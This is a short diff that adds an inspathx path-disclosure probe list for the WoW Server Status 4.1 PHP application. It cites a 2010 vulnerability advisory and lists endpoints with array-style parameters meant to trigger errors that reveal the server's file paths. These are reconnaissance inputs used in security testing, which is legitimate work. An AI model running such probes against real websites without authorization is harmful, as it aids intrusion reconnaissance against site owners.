@@ -1,0 +1,14 @@
+# inspathx # WoW-Server-Status_4.1
+##
+# Homepage: http://53x11.com/blog/2005/04/21/WoW-Server-Status-41.10
+# Date: 2011-01-29
+# http://www.itsecuritysolutions.org/2010-11-15_WoW_Server_Status_4.1_multiple_Information_Disclosure_vulnerabilities/
+##
+/status.php
+/wow_ss.php
+/wow_ss.php?update_timer[]=
+/wow_ss.php?realm[]=
+/wow_ss.php?region[]=
+/wow_ss.php?display[]=
+/wow_ss.php?image_type[]=
+/wow_ss.php?data_path[]=
